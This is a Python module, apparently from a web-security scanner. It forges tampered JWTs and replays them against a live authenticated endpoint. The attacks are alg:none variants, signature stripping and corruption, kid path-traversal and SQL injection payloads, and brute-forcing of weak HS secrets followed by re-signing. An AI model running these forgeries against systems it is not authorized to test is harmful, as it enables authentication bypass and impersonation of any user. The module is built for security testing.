"""JWT attack suite — the token-auth depth a generic DAST/Burp scan does not reach.

APP authenticates with a JWT in sessionStorage. The single highest-value active test for such an
app is: does the server actually VALIDATE the token, or can we forge one? This module forges a family
of tampered tokens from the live bearer and replays each against a real authenticated endpoint (an
"oracle" that returns 200 + data when authed). A forged token that still returns that data proves the
signature/claims are not enforced — full authentication bypass.

Attacks:
  - alg:none        RFC-anti-pattern: header {"alg":"none"} + empty signature. If accepted => forge any identity.
  - alg:none-variants  None / NONE / nOnE (case-bypass of naive "alg==none" blocklists).
  - signature-strip    header.payload.  (empty third segment) — some libs treat as unsigned.
  - signature-drop     header.payload   (two segments, no trailing dot).
  - sig-tamper         valid structure, flipped signature — MUST be rejected; 200 = no verification.
  - kid-injection      if the header carries `kid`, inject path-traversal / SQLi into it (key confusion / SQLi-in-kid).
  - weak-secret        if alg is HS*, brute-force the signing secret with a bundled list (stdlib hmac).
                       A cracked secret = we can mint a valid admin token at will (CRITICAL).
  - jku/x5u/x5c        flag presence (server may fetch an attacker-controlled key — manual SSRF/keyconfusion review).

SAFE: read-only replays against GET oracle endpoints, throttled, capped. Forging a token is a client-
side operation; we never mutate server state. All findings carry the full authed-baseline + forged
exchange as proof + a curl repro.
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import os
import time
from urllib.parse import urlsplit

from .evidence import curl, exchange
from .auth.session import Session

# A compact, high-signal HS-secret list (the classic dev/tutorial/library defaults). Extend via a
# file at D4ST_JWT_WORDLIST (one secret per line). Kept small so the crack pass is seconds, not hours.
_WEAK_SECRETS = [
    "secret", "secretkey", "secret_key", "your-256-bit-secret", "your_jwt_secret", "jwt_secret",
    "jwtsecret", "changeme", "change_me", "password", "passw0rd", "admin", "test", "dev",
    "supersecret", "super_secret", "mysecret", "my_secret", "key", "signingkey", "signing_key",
    "0123456789", "1234567890", "qwerty", "letmein", "default", "token", "tokensecret",
    "s3cr3t", "s3cret", "SecretKey", "ThisIsASecret", "aaaaaaaa", "12345678", "00000000",
    "hmacsecret", "apikey", "api_secret", "clientsecret", "client_secret", "jwtkey", "authsecret",
    # APP/.NET-flavoured guesses (product/tenant words seen in the app)
    "app", "appsecret", "acme", "acme", "issuer", "audience", "IssuerSigningKey",
]


def _b64url_decode(seg: str) -> bytes:
    pad = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + pad)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _decode(tok: str) -> tuple[dict, dict, str, str]:
    """Return (header, payload, signing_input, signature_b64). Raises on malformed."""
    parts = tok.split(".")
    header = json.loads(_b64url_decode(parts[0]))
    payload = json.loads(_b64url_decode(parts[1])) if len(parts) > 1 and parts[1] else {}
    sig = parts[2] if len(parts) > 2 else ""
    signing_input = ".".join(parts[:2])
    return header, payload, signing_input, sig


def _encode(header: dict, payload: dict, sig: str = "") -> str:
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}.{sig}"


def _bearer_of(session: Session) -> str:
    for k, v in (session.headers or {}).items():
        if k.lower() == "authorization":
            return str(v).split(" ", 1)[-1] if " " in str(v) else str(v)
    return ""


def _auth_header_name(session: Session) -> str:
    for k in session.headers:
        if k.lower() == "authorization":
            return k
    return "Authorization"


def _similar(a: str, b: str) -> bool:
    la, lb = len(a or ""), len(b or "")
    if la == 0 and lb == 0:
        return True
    hi = max(la, lb) or 1
    return abs(la - lb) / hi < 0.25


def _crack_hs(signing_input: str, sig_b64: str, alg: str) -> str | None:
    """Try to recover an HS256/384/512 secret. Returns the secret if found, else None."""
    digestmod = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                 "HS512": hashlib.sha512}.get(alg.upper())
    if not digestmod:
        return None
    try:
        want = _b64url_decode(sig_b64)
    except Exception:  # noqa: BLE001
        return None
    words = list(_WEAK_SECRETS)
    wl = os.environ.get("D4ST_JWT_WORDLIST")
    if wl and os.path.exists(wl):
        try:
            with open(wl, encoding="utf-8", errors="ignore") as fh:
                words += [ln.strip() for ln in fh if ln.strip()]
        except Exception:  # noqa: BLE001
            pass
    for secret in words:
        got = hmac.new(secret.encode(), signing_input.encode(), digestmod).digest()
        if hmac.compare_digest(got, want):
            return secret
    return None


def _sign_hs(header: dict, payload: dict, secret: str, alg: str) -> str:
    digestmod = {"HS256": hashlib.sha256, "HS384": hashlib.sha384,
                 "HS512": hashlib.sha512}[alg.upper()]
    h = _b64url(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), digestmod).digest()
    return f"{h}.{p}.{_b64url(sig)}"


def _pick_oracle(c, urls: list[str], authed: dict, origin: str, delay: float, throttle=None):
    """Find an authed GET endpoint that returns 200 with non-trivial data — our acceptance oracle."""
    from .safety import pace
    api = [u for u in urls if u.startswith(origin) and "/api/" in u.lower()]
    api = api or [u for u in urls if u.startswith(origin)]
    for u in api[:60]:
        try:
            r = c.get(u, headers=authed)
            pace(throttle, delay, r.status_code)
        except Exception:  # noqa: BLE001
            continue
        body = (r.text or "").strip()
        if r.status_code == 200 and body and body not in ("[]", "{}", "null", '""'):
            return u, r
    return None, None


def _finding(kind: str, severity: str, url: str, detail: str, base_r, probe_r,
             *, note: str = "", extra_ev: list | None = None) -> dict:
    ev = [exchange("Authenticated baseline (valid, unmodified token)", base_r),
          exchange(note or "PROOF — same request with a FORGED/tampered token", probe_r)]
    if extra_ev:
        ev = (extra_ev or []) + ev
    return {
        "type": kind, "name": kind, "severity": severity, "url": url, "method": "GET",
        "detail": detail, "category": kind, "verified": True,
        "evidence_log": ev, "repro": curl(probe_r),
        "evidence": {"authed_status": getattr(base_r, "status_code", None),
                     "probe_status": getattr(probe_r, "status_code", None),
                     "probe_snippet": (getattr(probe_r, "text", "") or "")[:400]},
    }


def run_jwt_attacks(session: Session, base: str, urls: list[str], *,
                    delay: float = 0.15, timeout: float = 12.0, throttle=None) -> list[dict]:
    """Forge a family of tampered tokens and replay each against a live authed oracle. Returns
    a list of finding dicts (each with full evidence_log + repro). Read-only; throttled."""
    import httpx

    from .safety import pace

    tok = _bearer_of(session)
    if not tok or tok.count(".") < 2:
        return []  # not a JWT-bearer session — nothing to do
    try:
        header, payload, signing_input, sig_b64 = _decode(tok)
    except Exception:  # noqa: BLE001
        return []

    origin = f"{urlsplit(base).scheme}://{urlsplit(base).netloc}"
    hname = _auth_header_name(session)
    authed = dict(session.headers)
    cookie = session.cookie_header(base)
    if cookie:
        authed["Cookie"] = cookie

    findings: list[dict] = []
    with httpx.Client(verify=False, follow_redirects=False, timeout=timeout) as c:
        oracle_url, base_r = _pick_oracle(c, urls, authed, origin, delay, throttle)
        if not oracle_url:
            return []
        base_body = base_r.text

        def _replay(forged: str, kind: str, sev: str, note: str, want_reject: bool = True):
            hdrs = dict(authed)
            hdrs[hname] = f"Bearer {forged}"
            try:
                r = c.get(oracle_url, headers=hdrs)
                pace(throttle, delay, r.status_code)
            except Exception:  # noqa: BLE001
                return
            accepted = r.status_code == 200 and _similar(r.text, base_body) and (r.text or "").strip()
            if accepted and want_reject:
                findings.append(_finding(
                    kind, sev, oracle_url,
                    f"forged token ({note}) was ACCEPTED — endpoint returned "
                    f"{r.status_code} with authenticated data (baseline {base_r.status_code}); "
                    f"the server does not enforce token integrity.", base_r, r,
                    note=f"PROOF — forged token: {note}"))

        # 1) alg:none family
        for alg_none in ("none", "None", "NONE", "nOnE"):
            h2 = dict(header); h2["alg"] = alg_none
            _replay(_encode(h2, payload, ""), "jwt-alg-none", "critical", f'alg="{alg_none}", empty signature')
        # 2) alg:none with expiry pushed far future (also proves exp not checked if base was near-expiry)
        p2 = dict(payload); p2["exp"] = int(time.time()) + 10 * 365 * 24 * 3600
        h3 = dict(header); h3["alg"] = "none"
        _replay(_encode(h3, p2, ""), "jwt-alg-none", "critical", "alg=none + 10y exp (forged long-lived identity)")
        # 3) signature stripped (empty 3rd segment) and dropped (2 segments)
        _replay(f"{signing_input}.", "jwt-signature-strip", "critical", "signature stripped (empty 3rd segment)")
        _replay(signing_input, "jwt-signature-strip", "critical", "signature removed (2-segment token)")
        # 4) signature tampered (flip the sig) — structure valid, sig wrong; MUST be rejected
        bad_sig = (sig_b64[:-4] + "AAAA") if len(sig_b64) > 4 else "AAAA"
        _replay(f"{signing_input}.{bad_sig}", "jwt-signature-not-verified", "critical", "valid structure, corrupted signature")
        # 5) kid injection (only if a kid claim exists)
        if isinstance(header.get("kid"), str):
            for inj, lbl in (("../../../../dev/null", "path-traversal in kid"),
                             ("' OR '1'='1", "SQLi in kid")):
                hk = dict(header); hk["kid"] = inj
                # keep original alg; if HS and we later crack, this would be re-signable — here just probe handling
                _replay(_encode(hk, payload, sig_b64), "jwt-kid-injection", "high",
                        f"{lbl} (kid header manipulation)")

        # 6) weak-secret crack (HS*) — offline, then PROVE by minting a valid token that's accepted
        alg = str(header.get("alg", ""))
        if alg.upper().startswith("HS"):
            secret = _crack_hs(signing_input, sig_b64, alg)
            if secret:
                # mint a token with an elevated/attacker identity, correctly signed with the cracked key
                forged_payload = dict(payload)
                forged = _sign_hs(header, forged_payload, secret, alg)
                hdrs = dict(authed); hdrs[hname] = f"Bearer {forged}"
                try:
                    r = c.get(oracle_url, headers=hdrs); pace(throttle, delay, r.status_code)
                except Exception:  # noqa: BLE001
                    r = base_r
                findings.append(_finding(
                    "jwt-weak-secret", "critical", oracle_url,
                    f"the HS{alg[2:] or '256'} signing secret is a weak/default value "
                    f"(recovered offline: '{secret}'). With the secret, an attacker mints a validly-"
                    f"signed token for ANY user/role. A freshly-minted token was accepted "
                    f"({getattr(r, 'status_code', '?')}).", base_r, r,
                    note=f"PROOF — token re-signed with the cracked secret '{secret}' (accepted)"))

        # 7) jku/x5u/x5c presence — server may fetch an attacker-controlled key (manual SSRF/key-confusion)
        for hdr_key in ("jku", "x5u", "x5c", "jwk"):
            if hdr_key in header:
                findings.append({
                    "type": "jwt-key-header", "name": "jwt-key-header", "severity": "medium",
                    "url": oracle_url, "method": "GET", "category": "jwt-key-header", "verified": False,
                    "detail": f"the JWT header carries a '{hdr_key}' parameter ({header.get(hdr_key)!r}). "
                              f"If the server fetches/trusts this key reference, an attacker may supply "
                              f"their own key (key-confusion / SSRF). Manual review recommended.",
                    "evidence_log": [exchange("Authenticated baseline (token header shown)", base_r)],
                    "repro": f"# decode the token header: echo '{tok.split('.')[0]}' | base64 -d",
                })

    return findings
